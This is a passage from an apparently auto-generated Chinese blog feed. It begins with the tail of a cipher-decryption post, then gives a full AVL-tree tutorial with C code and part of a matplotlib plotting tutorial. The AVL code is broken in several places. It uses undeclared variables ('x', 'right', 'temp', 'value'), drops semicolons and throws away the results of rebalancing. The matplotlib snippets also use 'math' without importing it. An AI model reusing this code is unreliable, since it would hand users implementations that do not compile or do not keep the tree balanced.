class="line">541F7925144585C8C4963AC9B5B1248A</span><br><span class="line">E4F11E16B9E289E8CD3EEC23D19D694A</span><br><span class="line">BDC28BFED0FCABCA7057F30DEAE901C7</span><br><span class="line">ACE067BB27BE9293E66139F25D120ABC</span><br><span class="line">2831CED3FBD55CCF9995436436C3D681</span><br><span class="line">58DA65DD1B781063D807F66B404B887A</span><br><span class="line"> </span><br><span class="line">key stream:</span><br><span class="line">2393B785D3C35D48248588D0C0159423</span><br><span class="line">1EEA</span><br><span class="line">cipher hexdump:</span><br><span class="line">4FE0E5CF93ED6D6848F3EEA6B236AD16</span><br><span class="line">2CDD</span><br><span class="line">decypt data:lsRJ@.0 lvfvr#9527</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Crypto </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>AvlTree</title>
      <link href="/2023/04/01/AvlTree/"/>
      <url>/2023/04/01/AvlTree/</url>
      
        <content type="html"><![CDATA[<h1 id="AvlTree"><a href="#AvlTree" class="headerlink" title="AvlTree"></a>AvlTree</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>AVL 树是一种平衡二叉树，得名于其发明者的名字（ Adelson-Velskii 以及 Landis）。（可见名字长的好处，命名都能多占一个字母出来）。平衡二叉树递归定义如下：</p><ol><li>左右子树的高度差小于等于 1。</li><li>其每一个子树均为平衡二叉树。</li></ol><p><strong>平衡因子</strong>： 某个结点的左子树的高度减去右子树的高度得到的差值。</p><p>AVL 树： 所有结点的平衡因子的绝对值都不超过 1 的二叉树。</p><p>为了计算平衡因子，我们自然需要在节点中引入高度这一属性。在这里，我们把节点的高度定义为其左右子树的高度的最大值。因此，引入了高度属性的 AVL 树的节点定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">node</span> &#123;</span><br><span class="line">    <span class="type">int</span>             data;</span><br><span class="line">    <span class="type">int</span>             height;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span>     *left;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">node</span>     *right;</span><br><span class="line">&#125;<span class="type">node_t</span>, * <span class="type">nodeptr_t</span>;</span><br></pre></td></tr></table></figure><p>计算某一个节点的高度</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">treeHeight</span><span class="params">(<span class="type">nodeptr_t</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(<span class="built_in">treeHeight</span>(root-&gt;left),<span class="built_in">treeHeight</span>(root-&gt;right)) + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们在进行如下操作时需要更新受影响的所有节点的高度：</p><ol><li>在插入结点时， 沿插入的路径更新结点的高度值</li><li>在删除结点时（delete）,沿删除的路径更新结点的高度值</li></ol><p>有了高度，计算平衡因子的操作就得以很简单的实现：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">treeGetBalanceFactor</span><span class="params">(<span class="type">nodeptr_t</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> x-&gt;left-&gt;height - x-&gt;right-&gt;height;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当平衡因子的绝对值大于 1 时，就会触发树的修正，或者说是再平衡操作。</p><h2 id="树的平衡化操作"><a href="#树的平衡化操作" class="headerlink" title="树的平衡化操作"></a>树的平衡化操作</h2><p>二叉树的平衡化有两大基础操作： 左旋和右旋。左旋，即是逆时针旋转；右旋，即是顺时针旋转。这种旋转在整个平衡化过程中可能进行一次或多次，这两种操作都是从失去平衡的最小子树根结点开始的(即离插入结点最近且平衡因子超过1的祖结点)。</p><h3 id="右旋"><a href="#右旋" class="headerlink" title="右旋"></a>右旋</h3><p><img src="/.io//v2-eee97a3e3e45d8cb6668841f6b44191a_1440w.webp" alt="img"></p><p>所谓右旋操作，就是把上图中的 B 节点和 C 节点进行所谓“父子交换”。在仅有这三个节点时候，是十分简单的。但是当 B 节点处存在右孩子时，事情就变得有点复杂了。我们通常的操作是：<strong>抛弃右孩子，将之和旋转后的节点 C 相连，成为节点 C 的左孩子</strong>。这样，我们就能写出对应的代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">nodeptr_t</span> <span class="title">treeRotateRight</span><span class="params">(<span class="type">nodeptr_t</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="type">nodeptr_t</span> left = root-&gt;left;</span><br><span class="line">    </span><br><span class="line">    root-&gt;left = left-&gt;right; <span class="comment">// 将将要被抛弃的节点连接为旋转后的 root 的左孩子</span></span><br><span class="line">    left-&gt;right = root; <span class="comment">// 调换父子关系</span></span><br><span class="line"></span><br><span class="line">    left-&gt;height = <span class="built_in">max</span>(<span class="built_in">treeHeight</span>(left-&gt;left), <span class="built_in">treeHeight</span>(left-&gt;right))+<span class="number">1</span>;</span><br><span class="line">    right-&gt;height = <span class="built_in">max</span>(<span class="built_in">treeHeight</span>(right-&gt;left), <span class="built_in">treeHeight</span>(right-&gt;right))+<span class="number">1</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> left;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="左旋"><a href="#左旋" class="headerlink" title="左旋"></a>左旋</h3><p><img src="/.io//v2-0a737f5850ac96deec1821c80391a08a_1440w.webp" alt="img"></p><p>左旋操作和右旋操作十分类似</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">nodeptr_t</span> <span class="title">treeRotateLeft</span><span class="params">(<span class="type">nodeptr_t</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="type">nodeptr_t</span> right = root-&gt;right;</span><br><span class="line"></span><br><span class="line">    root-&gt;right = right-&gt;left;</span><br><span class="line">    right-&gt;left = root;</span><br><span class="line"></span><br><span class="line">    left-&gt;height = <span class="built_in">max</span>(<span class="built_in">treeHeight</span>(left-&gt;left), <span class="built_in">treeHeight</span>(left-&gt;right))+<span class="number">1</span>;</span><br><span class="line">    right-&gt;height = <span class="built_in">max</span>(<span class="built_in">treeHeight</span>(right-&gt;left), <span class="built_in">treeHeight</span>(right-&gt;right))+<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> right;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="需要平衡的四种情况"><a href="#需要平衡的四种情况" class="headerlink" title="需要平衡的四种情况"></a>需要平衡的四种情况</h2><h3 id="LL"><a href="#LL" class="headerlink" title="LL"></a>LL</h3><p><img src="/.io//v2-58c02894bce9e580481c075efc35f226_1440w.webp" alt="img"></p><h3 id="RR"><a href="#RR" class="headerlink" title="RR"></a>RR</h3><p><img src="/.io//v2-58c02894bce9e580481c075efc35f226_1440w.webp" alt="img"></p><p>LR</p><p><img src="/.io//v2-acc2de5f4d30d41a6b39b0c5a9b2dbbe_1440w.webp" alt="img"></p><h3 id="RL"><a href="#RL" class="headerlink" title="RL"></a>RL</h3><h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>平衡化操作的实现</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">nodeptr_t</span> <span class="title">treeRebalance</span><span class="params">(<span class="type">nodeptr_t</span> root)</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> factor = <span class="built_in">treeGetBalanceFactor</span>(root);</span><br><span class="line">    <span class="keyword">if</span>(factor &gt; <span class="number">1</span> &amp;&amp; <span class="built_in">treeGetBalanceFactor</span>(root-&gt;left) &gt; <span class="number">0</span>) <span class="comment">// LL</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">treeRotateRight</span>(root);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(factor &gt; <span class="number">1</span> &amp;&amp; <span class="built_in">treeGetBalanceFactor</span>(root-&gt;left) &lt;= <span class="number">0</span>) &#123; <span class="comment">//LR</span></span><br><span class="line">        root-&gt;left = <span class="built_in">treeRotateLeft</span>(root-&gt;left);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">treeRotateRight</span>(temp);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(factor &lt; <span class="number">-1</span> &amp;&amp; <span class="built_in">treeGetBalanceFactor</span>(root-&gt;right) &lt;= <span class="number">0</span>) <span class="comment">// RR</span></span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">treeRotateLeft</span>(root);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>((factor &lt; <span class="number">-1</span> &amp;&amp; <span class="built_in">treeGetBalanceFactor</span>(root-&gt;right) &gt; <span class="number">0</span>) &#123; <span class="comment">// RL</span></span><br><span class="line">        root-&gt;right = <span class="built_in">treeRotateRight</span>(root-&gt;right);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">treeRotateLeft</span>(root);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// Nothing happened.</span></span><br><span class="line">        <span class="keyword">return</span> root;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="插入"><a href="#插入" class="headerlink" title="插入"></a>插入</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">treeInsert</span><span class="params">(<span class="type">nodeptr_t</span> *rootptr, <span class="type">int</span> value)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">nodeptr_t</span> newNode;</span><br><span class="line">    <span class="type">nodeptr_t</span> root = *rootptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        newNode = <span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(<span class="type">node_t</span>));</span><br><span class="line">        <span class="built_in">assert</span>(newNode);</span><br><span class="line"></span><br><span class="line">        newNode-&gt;data = value;</span><br><span class="line">        newNode-&gt;left = newNode-&gt;right = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">        *rootptr = newNode;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span>(root-&gt;data == value) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;data &lt; value)</span><br><span class="line">            <span class="built_in">treeInsert</span>(&amp;root-&gt;right,value);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">treeInsert</span>(&amp;root-&gt;left,value)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">treeRebalance</span>(root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="删除"><a href="#删除" class="headerlink" title="删除"></a>删除</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">treeDelete</span><span class="params">(<span class="type">nodeptr_t</span> *rootptr, <span class="type">int</span> data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">nodeptr_t</span> *toFree; <span class="comment">// 拜拜了您呐</span></span><br><span class="line">    <span class="type">nodeptr_t</span> root = *rootptr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root) &#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;data == value) &#123;</span><br><span class="line">            <span class="keyword">if</span>(root-&gt;right) &#123;</span><br><span class="line">                root-&gt;data = <span class="built_in">treeDeleteMin</span>(&amp;(root-&gt;right));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                toFree = root;</span><br><span class="line">                *rootptr = toFree-&gt;left;</span><br><span class="line">                <span class="built_in">free</span>(toFree);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;data &lt; value)</span><br><span class="line">            <span class="built_in">treeDelete</span>(&amp;root-&gt;right,value);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">treeDelete</span>(&amp;root-&gt;left,value)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">treeRebalance</span>(root);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Algorithms </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib</title>
      <link href="/2023/04/01/matplotlib/"/>
      <url>/2023/04/01/matplotlib/</url>
      
        <content type="html"><![CDATA[<h1 id="matplotlib"><a href="#matplotlib" class="headerlink" title="matplotlib"></a>matplotlib</h1><h2 id="why-matplotlib"><a href="#why-matplotlib" class="headerlink" title="why matplotlib?"></a>why matplotlib?</h2><p>如果您使用过“工科神器”MATLAB，您一定会惊叹于MATLAB中惊人的可视化能力，其中的函数绘图，成为了无数SCI论文中真实数据配图的来源。小小的plot函数，画出了人类先进科学进步的曲线。</p><p>python中的matplotlib库，与MATLAB中的plot函数有点像，也许这正是它名字的来源。这是一个2D绘图库，利用它可以画出许多高质量的图像。只需几行代码即可生成直方图，条形图，饼图，散点图等。Matplotlib可用于Python脚本，Python和IPython shell，Jupyter笔记本，Web应用程序服务器和四个图形用户界面工具包。</p><p>希望以下教程可以为您带来一些帮助。</p><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>请查看上方anaconda教程，配置好python环境。使用命令<code>pip install matplotlib</code> 或 <code>conda install matplotlib </code> 进行安装。使用时，直接import即可。</p><h2 id="Matplotlib-pyplot"><a href="#Matplotlib-pyplot" class="headerlink" title="Matplotlib.pyplot"></a>Matplotlib.pyplot</h2><p>Matplotlib 中的 pyplot 模块是一个类似命令风格的函数集合，这使得 Matplotlib 的工作模式和 MATLAB 相似。</p><p>pyplot 模块提供了可以用来绘图的各种函数，比如创建一个画布，在画布中创建一个绘图区域，或是在绘图区域添加一些线、标签等。以下表格对这些函数做了简单地介绍。若您有MATLAB基础，看着本节即可上手使用。</p><h2 id="绘图类型"><a href="#绘图类型" class="headerlink" title="绘图类型"></a>绘图类型</h2><table><thead><tr><th>函数名称</th><th>描述</th></tr></thead><tbody><tr><td>Bar</td><td>绘制条形图</td></tr><tr><td>Barh</td><td>绘制水平条形图</td></tr><tr><td>Boxplot</td><td>绘制箱型图</td></tr><tr><td>Hist</td><td>绘制直方图</td></tr><tr><td>his2d</td><td>绘制2D直方图</td></tr><tr><td>Pie</td><td>绘制饼状图</td></tr><tr><td>Plot</td><td>在坐标轴上画线或者标记</td></tr><tr><td>Polar</td><td>绘制极坐标图</td></tr><tr><td>Scatter</td><td>绘制x与y的散点图</td></tr><tr><td>Stackplot</td><td>绘制堆叠图</td></tr><tr><td>Stem</td><td>用来绘制二维离散数据绘制（又称为“火柴图”）</td></tr><tr><td>Step</td><td>绘制阶梯图</td></tr><tr><td>Quiver</td><td>绘制一个二维按箭头</td></tr></tbody></table><h3 id="Image函数"><a href="#Image函数" class="headerlink" title="Image函数"></a>Image函数</h3><table><thead><tr><th>函数名称</th><th>描述</th></tr></thead><tbody><tr><td>Imread</td><td>从文件中读取图像的数据并形成数组。</td></tr><tr><td>Imsave</td><td>将数组另存为图像文件。</td></tr><tr><td>Imshow</td><td>在数轴区域内显示图像。</td></tr></tbody></table><h3 id="Axis函数"><a href="#Axis函数" class="headerlink" title="Axis函数"></a>Axis函数</h3><table><thead><tr><th>函数名称</th><th>描述</th></tr></thead><tbody><tr><td>Axes</td><td>在画布(Figure)中添加轴</td></tr><tr><td>Text</td><td>向轴添加文本</td></tr><tr><td>Title</td><td>设置当前轴的标题</td></tr><tr><td>Xlabel</td><td>设置x轴标签</td></tr><tr><td>Xlim</td><td>获取或者设置x轴区间大小</td></tr><tr><td>Xscale</td><td>设置x轴缩放比例</td></tr><tr><td>Xticks</td><td>获取或设置x轴刻标和相应标签</td></tr><tr><td>Ylabel</td><td>设置y轴的标签</td></tr><tr><td>Ylim</td><td>获取或设置y轴的区间大小</td></tr><tr><td>Yscale</td><td>设置y轴的缩放比例</td></tr><tr><td>Yticks</td><td>获取或设置y轴的刻标和相应标签</td></tr></tbody></table><h3 id="Figure函数"><a href="#Figure函数" class="headerlink" title="Figure函数"></a>Figure函数</h3><table><thead><tr><th>函数名称</th><th>描述</th></tr></thead><tbody><tr><td>Figtext</td><td>在画布上添加文本</td></tr><tr><td>Figure</td><td>创建一个新画布</td></tr><tr><td>Show</td><td>显示数字</td></tr><tr><td>Savefig</td><td>保存当前画布</td></tr><tr><td>Close</td><td>关闭画布窗口</td></tr></tbody></table><h2 id="第一个绘图程序"><a href="#第一个绘图程序" class="headerlink" title="第一个绘图程序"></a>第一个绘图程序</h2><p>首先导入 Matplotlib 包中的 Pyplot 模块，并以 as 别名的形式简化引入包的名称。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br></pre></td></tr></table></figure><p>接下来，使用 NumPy 提供的函数 arange() 创建一组数据来绘制图像。</p><p>如果您对numpy库并不了解，可以理解为这就是在生成列表数据即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#引入numpy包</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="comment">#获得0到2π之间的数据，每个数据间隔0.05</span></span><br><span class="line">x = np.arange(<span class="number">0</span>, math.pi*<span class="number">2</span>, <span class="number">0.05</span>)</span><br></pre></td></tr></table></figure><p>我们这里来绘制sin函数的值。使用numpy库内置函数计算出值（实际上是矩阵），放入y中，作为函数值。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">y = np.sin(x)</span><br></pre></td></tr></table></figure><p>此时，使用plot函数进行绘制即可。绘制完后，需要使用show函数展示出来才行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">plt.plot(x,y)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20230318120404283.png" alt="image-20230318120404283"></p><p>这个图像实在是光秃秃。我们在show之前添加一些属性设置。设置上图像的标题、标签。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">plt.xlabel(<span class="string">&quot;angle&quot;</span>)</span><br><span class="line">plt.ylabel(<span class="string">&quot;sine&quot;</span>)</span><br><span class="line">plt.title(<span class="string">&#x27;sine wave&#x27;</span>)</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20230318120557553.png" alt="image-20230318120557553"></p><p>这样，图像勉强能看了。</p><p>您也可以在 Jupyter 笔记本中运行 Matplotlib 的绘图程序。通过命令行或者开始菜单的方式启动 Jupyter 笔记本。启动成功后，将上述代码拷贝到输入行内，如下所示：</p><p><img src="/.io//1522405532-1.gif" alt="jupyter使用"></p><p>%matplotlib inline 是 Jupyter 提供的魔法命令，它可以把输出图显示在笔记本内部，否则会以查看器的形式单独显示。</p><h2 id="title、label、坐标轴设置"><a href="#title、label、坐标轴设置" class="headerlink" title="title、label、坐标轴设置"></a>title、label、坐标轴设置</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">plt.title(<span class="string">&quot;title&quot;</span>)<span class="comment">#括号当中输入标题的名称</span></span><br><span class="line">plt.xlim(<span class="number">0</span>,<span class="number">6</span>) <span class="comment">#x轴坐标轴</span></span><br><span class="line">plt.ylim((<span class="number">0</span>, <span class="number">3</span>))<span class="comment">#y轴坐标轴</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;X&#x27;</span>)<span class="comment">#x轴标签</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Y&#x27;</span>)<span class="comment">#y轴标签</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>可以对相应属性进行设置。</p><p>其中，x、y坐标轴的设置，又一般使用plot函数进行设置。</p><h2 id="Figure画布对象与Axes坐标轴对象"><a href="#Figure画布对象与Axes坐标轴对象" class="headerlink" title="Figure画布对象与Axes坐标轴对象"></a>Figure画布对象与Axes坐标轴对象</h2><p>在matplotlib中，整个图像为一个Figure对象。在Figure对象中可以包含一个或者多个Axes对象。每个Axes(ax)对象都是一个拥有自己坐标系统的<strong>绘图区域</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plt.figure(figsize=(<span class="number">6</span>, <span class="number">3</span>))</span><br><span class="line">plt.plot(<span class="number">6</span>, <span class="number">3</span>)</span><br><span class="line">plt.plot(<span class="number">3</span>, <span class="number">3</span> * <span class="number">2</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20230318121336375.png" alt="image-20230318121336375"></p><p>如果我们要在一个代码中生成多张图，就需要多个画布，也就是多个figure对象。那么此时，我们就转变为对各个画布对象进行操作，而非plt库的默认画布。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> matplotlib <span class="keyword">import</span> pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="comment">#创建图形对象</span></span><br><span class="line">fig = plt.figure()</span><br></pre></td></tr></table></figure><table><thead><tr><th>参数</th><th>说明</th></tr></thead><tbody><tr><td>figsize</td><td>指定画布的大小，(宽度,高度)，单位为英寸。</td></tr><tr><td>dpi</td><td>指定绘图对象的分辨率，即每英寸多少个像素，默认值为80。</td></tr><tr><td>facecolor</td><td>背景颜色。</td></tr><tr><td>dgecolor</td><td>边框颜色。</td></tr><tr><td>frameon</td><td>是否显示边框。</td></tr></tbody></table><p>有了画布，我们还要添加坐标轴对象。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ax = fig.add_axes([<span class="number">0.1</span>,<span class="number">0.1</span>,<span class="number">0.8</span>,<span class="number">0.8</span>])</span><br></pre></td></tr></table></figure><p>add_axes() 的参数值是一个序列，序列中的 4 个数字分别对应图形的左侧，底部，宽度，和高度，且每个数字必须介于 0 到 1 之间。</p><p>即将画布的宽、高作为 1 个单位。比如，[ 0.1, 0.1, 0.8, 0.8]，它代表着从画布 10% 的位置开始绘制, 宽高是画布的 80%。</p><p>坐标轴对象可以设置标题，设置标签，进行绘图。与原本的库一样的调用方式。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">0</span>, math.pi*<span class="number">2</span>, <span class="number">0.05</span>)</span><br><span class="line">y = np.sin(x)</span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = fig.add_axes([<span class="number">0.1</span>,<span class="number">0.1</span>,<span class="number">0.8</span>,<span class="number">0.8</span>])</span><br><span class="line">ax.plot(x,y)</span><br><span class="line">ax.set_title(<span class="string">&quot;sine wave&quot;</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;angle&#x27;</span>)</span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;sine&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20230318123811971.png" alt="image-20230318123811971"></p><h2 id="label、legend图例设置"><a href="#label、legend图例设置" class="headerlink" title="label、legend图例设置"></a>label、legend图例设置</h2><p>在画图时，可以添加label属性，传入图例。并通过legend启动，添加loc属性选择图例位置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">x = np.arange(<span class="number">0</span>, math.pi*<span class="number">2</span>, <span class="number">0.05</span>)</span><br><span class="line">y = np.sin(x)</span><br><span class="line">plt.plot(x,y,label=<span class="string">&quot;sin&quot;</span>)</span><br><span class="line">plt.legend(loc=<span class="string">&quot;best&quot;</span>)<span class="comment">#图例位置，可选best，center等</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><h2 id="一图多线"><a href="#一图多线" class="headerlink" title="一图多线"></a>一图多线</h2><p>在同一个figure下，直接使用plot进行画图即可。同一张图上可以全部显示出来。注意添加label参数以作区别。</p><p>如果要画多张图，可以在两个plot方法之间使用figure方法创造一个新的窗口，进行分别展示。</p><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>有时候我们需要对特定的点进行标注，我们可以使用 plt.annotate 函数来实现:</p><p>s: 注释信息内容</p><p>xy:箭头点所在的坐标位置</p><p>xytext:注释内容的坐标位置</p><p>arrowprops：设置指向箭头的参数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">x=np.linspace(<span class="number">0</span>,<span class="number">10</span>,<span class="number">200</span>)<span class="comment">#从0到10之间等距产生200个值</span></span><br><span class="line">y=np.sin(x)</span><br><span class="line"></span><br><span class="line">plt.plot(x,y,linestyle=<span class="string">&#x27;:&#x27;</span>,color=<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">plt.annotate(text=<span class="string">&#x27;here&#x27;</span>,xy=(<span class="number">3</span>,np.sin(<span class="number">3</span>)),xytext=(<span class="number">4</span>,-<span class="number">0.5</span>),weight=<span class="string">&#x27;bold&#x27;</span>,color=<span class="string">&#x27;b&#x27;</span>,arrowprops=<span class="built_in">dict</span>(arrowstyle=<span class="string">&#x27;-|&gt;&#x27;</span>,color=<span class="string">&#x27;k&#x27;</span>))</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p><img src="/.io//image-20230318121953844.png" alt="image-20230318121953844"></p><h2 id="子图"><a href="#子图" 